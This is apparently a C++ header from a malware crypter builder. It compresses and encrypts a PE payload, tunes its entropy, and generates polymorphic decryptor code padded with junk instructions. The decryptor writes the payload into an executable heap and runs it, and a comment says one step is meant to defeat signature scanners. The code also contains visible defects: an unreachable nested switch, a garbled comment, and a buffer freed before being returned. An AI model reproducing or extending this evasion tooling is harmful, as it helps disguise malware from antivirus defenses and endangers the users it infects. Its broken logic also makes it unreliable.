#ifndef __DECRYPTOR__
#define __DECRYPTOR__

#include "mCodeLines.h"
#include "mPayloadChunks.h"
#include "mOutputPatcher.h"
#include "mCompiler.h"
#include "base64.h"
#include "mutate.h"
#include "mPathBuilder.h"
#include "mCompiler.h"

#define PAYLOAD_CHUNK_TEXT1		0
#define PAYLOAD_CHUNK_TEXT2		1
#define PAYLOAD_CHUNK_DATA		2
#define PAYLOAD_CHUNK_RDATA		3
#define PAYLOAD_CHUNK_RCDATA	4
#define PAYLOAD_CHUNK_FONT		5

#define PE_LDR_FLAG_USE_APLIB	0x1
#define PE_LDR_FLAG_NOT_STUB	0x2

PMBUF ldr_restore_compiled = NULL;

void encrypt_data(DWORD hresult, PVOID data, DWORD data_size, DWORD decrypt_count, OPERATION_SEQUENCE* decrypt, DWORD hash_count, OPERATION_SEQUENCE* hash)
{
	PBYTE dw_data = (PBYTE)data;
	for(int i = 0; i < data_size; i++)
	{
		// process decrypt operations
		for(int j = 0; j < decrypt_count; j++)
		{
			switch( decrypt[j].type )
			{
			case DOT_ADD: dw_data[i] += hresult; break;
			case DOT_SUB: dw_data[i] -= hresult; break;
			case DOT_ROR: dw_data[i] = _rotr8(dw_data[i],hresult); break;
			case DOT_ROL: dw_data[i] = _rotl8(dw_data[i],hresult); break;
			case DOT_XOR: dw_data[i] ^= hresult; break;
			}
		}

		hresult = mPayloadChunks::eval_operations(hash, hash_count, hresult);
	}
}

PMBUF create_ldr_restore(PMBUF ldr_restore, DWORD dwDecompressFuncSize, PMBUF file_data, mPayloadChunks* payload, DWORD ldr_flags, DWORD decrypt_seed, DWORD decrypt_count, OPERATION_SEQUENCE* decrypt, DWORD hash_count, OPERATION_SEQUENCE* hash)
{
	DWORD64 rand_name;
	DWORD	pid;

#ifdef CONFIG_DEBUG_SOURCE
	rand_name = 0;
	pid = 0;
#else
	rand_name = random.get();
	pid = GetCurrentProcessId();
#endif

	mPathBuilder	path_builder(pid, rand_name);
	mCompiler		compiler(&path_builder, file_data->data);
	CHAR			digit[16];

	path_builder.create_tmp_folder();

	PMPAYLOAD_CHUNK chunk = payload->get_chunk(PAYLOAD_CHUNK_RCDATA);

	std::string source((PCHAR)ldr_restore->data, ldr_restore->size);

	str_replace("%ENTR_HASH%", itoa(chunk->seed, digit, 16), source);
	str_replace("%ENTR_SIZE%", itoa(chunk->entr_size, digit, 16), source);
	str_replace("%LDR_PE_LOADER_SIZE%", itoa(dwDecompressFuncSize, digit, 10), source);
	str_replace("%FILE_SIZE%", itoa(file_data->size, digit, 10), source);
	str_replace("%ORIG_SIZE%", itoa(chunk->orig_size, digit, 10), source);
	str_replace("%FLAGS%", itoa(ldr_flags, digit, 16), source);
	str_replace("%ADDED_BYTES%", itoa(chunk->entr_size - chunk->orig_size, digit, 16), source);

	UINT32 max_step = chunk->entr_size!=chunk->orig_size ? chunk->entr_size/(chunk->entr_size - chunk->orig_size) : 0;

	str_replace("max_step", itoa(max_step, digit, 10), source);

	CHAR hash_string[128];

	mPayloadChunks::operations2str(hash_string, "entr_hash", payload->get_entr_ops(), payload->get_entr_ops_count());

	str_replace("%HASH_STRING%", hash_string, source);

	// decryptor data

	str_replace("%DECRYPT_INIT_HASH%", itoa(decrypt_seed, digit, 16), source);

	mPayloadChunks::operations2str(hash_string, "decr_hash", hash, hash_count);
	str_replace("%DECRYPT_CALC_HASH%", hash_string, source);

	CHAR format[128];
	CHAR string[128];
	CHAR string2[128];

	lstrcpyA(format, "params->orig_data[i] = %s;\r\n");

	for(int i = 0; i < decrypt_count ; i++)
	{
		switch( decrypt[i].type )
		{
		case DOT_ADD: wsprintfA(string, format, "(%s - decr_hash)"); break;
		case DOT_SUB: wsprintfA(string, format, "(%s + decr_hash)"); break;
		case DOT_ROR: wsprintfA(string, format, "_rotl8(%s, decr_hash)"); break;
		case DOT_ROL: wsprintfA(string, format, "_rotr8(%s, decr_hash)"); break;
		case DOT_XOR: wsprintfA(string, format, "(%s ^ decr_hash)"); break;
		}

		lstrcpyA(format, string);
	}

	wsprintfA(string, format, "params->orig_data[i]");
	str_replace("%DECRYPT%", string, source);


	path_builder.add_file("ldr_restore.cpp", (PVOID)source.c_str(), source.length());

	compiler.add_file("ldr_restore.cpp");
	compiler.set_entry_point("ldr_restore_ep");
	compiler.set_advanced_flags("/O1");

	CHAR out_file[MAX_PATH];

	lstrcpyA(out_file, path_builder.get_tmp_folder());
	lstrcatA(out_file, "ldr_restore.bin");

	if( compiler.build(out_file)==-1 )
	{
		_tprintf(_T("Error: can not build ldr_restore!\r\n"));

#ifdef _DEBUG
		__debugbreak();
#endif
		return NULL;
	}

	PMBUF file = path_builder.get_file("ldr_restore.bin");
	if( file )
	{
		PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((DWORD_PTR)file->data + ((PIMAGE_DOS_HEADER)file->data)->e_lfanew);
		PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

		DWORD real_size = sec->Misc.VirtualSize < sec->SizeOfRawData ? sec->Misc.VirtualSize : sec->SizeOfRawData;

		PMBUF binary = mem_alloc(real_size);
		if( binary )
		{
			mem_copy(binary->data, file->data + sec->PointerToRawData, real_size);
			binary->size = real_size;

			mem_free(file);

			return binary;
		}else{
			_tprintf(_T("Error: Can not alloc for ldr_restore %d bytes\r\n"), real_size);
		}

		mem_free(file);
	}else{
		_tprintf(_T("Error: Can not get ldr_restore.bin\r\n"));
	}

	return NULL;
}

PMBUF add_decryptor(mCodeGenerator* generator, PMCODE_BLOCK parent, mOutputPatcher* patcher, PMBUF file_data, mPayloadChunks* payload)
{
	PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)file_data->data;
	PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((DWORD_PTR)dos + dos->e_lfanew);

	PMBUF /*ldr_pe_loader, */ldr_restore;

	// check is file 32 or 64
// 	if( nt->FileHeader.Machine==IMAGE_FILE_MACHINE_I386 )
// 	{
// 		ldr_pe_loader = load_resource(IDR_SHELLCODE32);
// 	}else{
// 		ldr_pe_loader = load_resource(IDR_SHELLCODE64);
// 	}

	ldr_restore = load_resource(IDR_RESTORE_SHELLCODE);

	if( !ldr_restore /*|| !ldr_pe_loader*/ )
		return NULL;

	PMBUF aplib_data = load_resource(IDR_APLIB32);
	if (!aplib_data)
		return NULL;

	HMODULE aplib = file2image(aplib_data->data);

	typedef int(__stdcall* TD_ap_pack)(const void* source, void* destination, size_t length, void* workmem, int (*callback)(size_t, size_t, size_t, void*), void* cbparam);

	TD_ap_pack ap_pack = (TD_ap_pack)find_proc_by_name(aplib, "_aP_pack");
	auto _ap_depack = find_proc_by_name(aplib, "_aP_depack_asm_safe");
	auto _ap_maxpacked_size = find_proc_by_name(aplib, "_aP_max_packed_size");

	if (!ap_pack)
		return NULL;

	DWORD _ap_depack_range = (DWORD)_ap_depack - (DWORD)_ap_maxpacked_size;

	// init before, after to prevent signature scanner
	DWORD total_size = ALIGN_UP(/*ldr_pe_loader->size + */file_data->size + _ap_depack_range, 4);
	PMBUF result = mem_alloc(total_size);

	if( result )
	{
		result->free = 0;
		DWORD use_aplib = 1;

		// add shellcode and file data
		mem_copy(result->data, _ap_depack, _ap_depack_range);

		DWORD compressed_size = 0;
		PVOID ap_work = VirtualAlloc(NULL,640*1024,MEM_COMMIT,PAGE_READWRITE);

		if( ap_work )
		{
			//if data is upx then compressed will be large then orig
			PVOID compressed_data = VirtualAlloc(NULL,file_data->size*2,MEM_COMMIT,PAGE_READWRITE);
			if( compressed_data )
			{
				if( (compressed_size = ap_pack(file_data->data,compressed_data,file_data->size,ap_work,NULL,NULL))>0 )
				{
					if( compressed_size < file_data->size )
					{
						mem_copy(&result->data[_ap_depack_range], compressed_data, compressed_size);
					}else{
						mem_copy(&result->data[_ap_depack_range], file_data->data, file_data->size);

						compressed_size = file_data->size;
						use_aplib = 0;
					}
				}else{
#ifdef _DEBUG
					__debugbreak();
#endif
					return NULL;
				}

				VirtualFree(compressed_data,NULL,MEM_RELEASE);
			}else{
#ifdef _DEBUG
				__debugbreak();
#endif
				return NULL;
			}

			VirtualFree(ap_work,NULL,MEM_RELEASE);
		}else{
#ifdef _DEBUG
			__debugbreak();
#endif
			return NULL;
		}

		result->size = _ap_depack_range + compressed_size;
		result->size = ALIGN_UP(result->size, 4);

		// create encryptor
		OPERATION_SEQUENCE	hash_operations[6];
		DWORD				hash_operations_count;			

		hash_operations_count = mPayloadChunks::create_operations(hash_operations, 2 , 3, TRUE);

		OPERATION_SEQUENCE decrypt_operations[3];
		DWORD			   decrypt_operations_count;	

		decrypt_operations_count = mPayloadChunks::create_operations(decrypt_operations, 2, 3, FALSE);

		//bugfix: prevent 0xF and 0 bits, because hash will be bad may 0 or FF will be
		DWORD ldr_pe_seed = mutate_get_imm32();

		encrypt_data(ldr_pe_seed, result->data, result->size, decrypt_operations_count, decrypt_operations, hash_operations_count, hash_operations);

		// create descryptor string
		mCodeLines	lines(generator, parent);
		
		DWORD offset = 0;

		////////////////////////////////////////////
		// Enrtopy
		////////////////////////////////////////////
		mPayloadEntropy entropy;

		entropy.set_data(result->data, result->size);

		BYTE text_byte = entropy.get_top_byte();

		// 5.0 - 7.0
		payload->add_chunk(PAYLOAD_CHUNK_RCDATA, offset, result->data, result->size, text_byte, 5, true); // was 6.5
		payload->prepare();
		////////////////////////////////////////////
		// Enrtopy End
		////////////////////////////////////////////

		DWORD ldr_flags = 0;

		ldr_flags |= (use_aplib ? PE_LDR_FLAG_USE_APLIB : 0);
		ldr_flags |= (config.not_use_crt_stub  ? PE_LDR_FLAG_NOT_STUB : 0);

		ldr_restore_compiled = create_ldr_restore(ldr_restore, _ap_depack_range, file_data, payload, ldr_flags, ldr_pe_seed, decrypt_operations_count, decrypt_operations,hash_operations_count, hash_operations );
		if( !ldr_restore_compiled )
			return NULL;

		DWORD ldr_restore_start = mutate_get_imm32();

		encrypt_data(ldr_restore_start, ldr_restore_compiled->data, ldr_restore_compiled->size, decrypt_operations_count, decrypt_operations, hash_operations_count, hash_operations);

		PMPAYLOAD_CHUNK chunk = payload->get_chunk(PAYLOAD_CHUNK_RCDATA);

		mVars* locals = generator->get_locals();

		locals->add_custom_ex("BYTE", "bt", "0");
		locals->add_custom_ex("DWORD", "hash", "0");
		locals->add_custom_ex("PBYTE", "rcdata", "nullptr");
		locals->add_custom_ex("PBYTE", "rcdata_byte", "nullptr");
		locals->add_custom_ex("TD_HeapCreate", "pHeapCreate", "nullptr");
		locals->add_custom_ex("PBYTE", "executed_byte", "nullptr");
		locals->add_custom_ex("PBYTE", "executed", "nullptr");
		locals->add_custom_ex("DWORD", "hc_1", "0");
		locals->add_custom_ex("DWORD", "hc_2", "0");
		locals->add_custom_ex("DWORD", "hc_3", "0");

		mutate_mov_imm32(&lines, "hc_1", 0x40000);
		mutate_mov_imm32(&lines, "hc_2", ldr_restore_compiled->size + chunk->entr_size);
		lines.add("hc_3 = hc_2;\r\n");


		lines.add("pHeapCreate = (TD_HeapCreate)*(PDWORD_PTR)((DWORD_PTR)hInstance + 0x%0.8X);\r\n", patcher->get_import_marker("HeapCreate"));

		lines.add("executed = (PBYTE)pHeapCreate(hc_1,hc_2,hc_3);\r\n");

		lines.add("executed_byte = executed;\r\n");
		
		mutate_create32(locals, "i");
		mutate_create32(locals, "ldr_restore_size");

		UINT32 while_start = random.get_less(0,255);
		UINT32 while_max_step = 0x7FFFFFFF / (chunk->entr_size + 1);
		UINT32 while_step  = random.get_less(1,while_max_step);

		lines.add("hash = 0x%0.8X;\r\n", ldr_restore_start);
		lines.add("i = %d;\r\n", while_start);
		lines.add("rcdata = (PBYTE)((DWORD_PTR)hInstance + 0x%0.8X);\r\n", patcher->get_rcdata_marker(1, 0));
		//lines.add("rcdata = (PBYTE)((DWORD_PTR)hInstance + 0x%0.8X);\r\n", patcher->get_font_marker(1, 0));
		lines.add("rcdata_byte = rcdata;\r\n");

		mutate_mov_imm32(&lines, "ldr_restore_size", while_start + ldr_restore_compiled->size*while_step);

		//�������: ������ MCODELINE_FLAG_NO_TRASH, ������ ����� ���� ������ ���� � ����� �����, � ���������� ������ � �����
		lines.set_trash_flags(IS_LOOP | DO_NOT_CHANGE_PARENT);
		PMCODE_BLOCK block_decryption_loop = lines.add_ex(MCODELINE_FLAG_NO_TRASH, "while( i < ldr_restore_size )");

		lines.push();

		lines.add("bt = *rcdata_byte;\r\n");

		for(int i = decrypt_operations_count - 1; i >= 0 ; i--)
		{
			switch( decrypt_operations[i].type )
			{
				case DOT_ADD: lines.add("bt = (bt - hash);\r\n"); break;
				case DOT_SUB: lines.add("bt = (bt + hash);\r\n"); break;
				case DOT_ROR: lines.add("bt = _rotl8(bt, hash);\r\n"); break;
				case DOT_ROL: lines.add("bt = _rotr8(bt, hash);\r\n"); break;
				case DOT_XOR: lines.add("bt = (bt ^ hash);\r\n"); break;
			}
		}

		lines.add("*executed_byte = bt;\r\n");
		lines.add("rcdata_byte++;\r\n");
		lines.add("executed_byte++;\r\n");

		for(int i = 0; i < hash_operations_count; i++)
		{
			switch( hash_operations[i].type )
			{
				switch( decrypt_operations[i].type )
				{
				case DOT_ADD: lines.add("bt = (bt - hash);\r\n"); break;
				case DOT_SUB: lines.add("bt = (bt + hash);\r\n"); break;
				case DOT_ROR: lines.add("bt = _rotl8(bt, hash);\r\n"); break;
				case DOT_ROL: lines.add("bt = _rotr8(bt, hash);\r\n"); break;
				case DOT_XOR: lines.add("bt = (bt ^ hash);\r\n"); break;
				}
			}
		}

		for(int i = 0; i < hash_operations_count ; i++)
		{
			switch( hash_operations[i].type )
			{
				case DOT_ADD: lines.add("hash = (hash + 0x%0.8X);\r\n", hash_operations[i].imm); break;
				case DOT_SUB: lines.add("hash = (hash - 0x%0.8X);\r\n", hash_operations[i].imm); break;
				case DOT_MUL: lines.add("hash = (hash * 0x%0.8X);\r\n", hash_operations[i].imm); break;
				case DOT_DIV: lines.add("hash = (hash / 0x%0.8X);\r\n", hash_operations[i].imm); break;
				case DOT_ROR: lines.add("hash = _rotr(hash,0x%0.8X);\r\n", hash_operations[i].imm); break;
				case DOT_ROL: lines.add("hash = _rotl(hash,0x%0.8X);\r\n", hash_operations[i].imm); break;
				case DOT_XOR: lines.add("hash = (hash ^ 0x%0.8X);\r\n", hash_operations[i].imm); break;
			}
		}

		lines.add("i += %d;\r\n", while_step);
		lines.pop();

		// BUGFIX: we must emulate trash in loop, or after may be switch,if and not work correct
		for(int i = 1; i < ldr_restore_compiled->size; i++)
		{
			generator->emulate_block(block_decryption_loop, false);
		}

		lines.set_trash_flags(NULL);
		
		// create launcher
#ifdef  CONFIG_DEBUG_PAYLOAD
		lines.add("__debugbreak();\r\n");
#endif
		
		locals->add_custom("LDR_RESTORE_PARAMS", "rest_params");

		lines.add("rest_params.orig_data = (PBYTE)executed + %d;\r\n", ldr_restore_compiled->size);
		lines.add("rest_params.entr_data = (PBYTE)rcdata + %d;\r\n",ldr_restore_compiled->size);
		lines.add("rest_params.base = (DWORD_PTR)hInstance;\r\n");
		lines.add("rest_params.ret_func = (DWORD_PTR)runPayload;\r\n");

		//lines.add_ex(MCODELINE_FLAG_NO_TRASH,"__debugbreak();\r\n");
		lines.add("((TD_ldr_restore)executed)(&rest_params);\r\n");

		

		mem_free(result);
	}

	return result;
}

#endif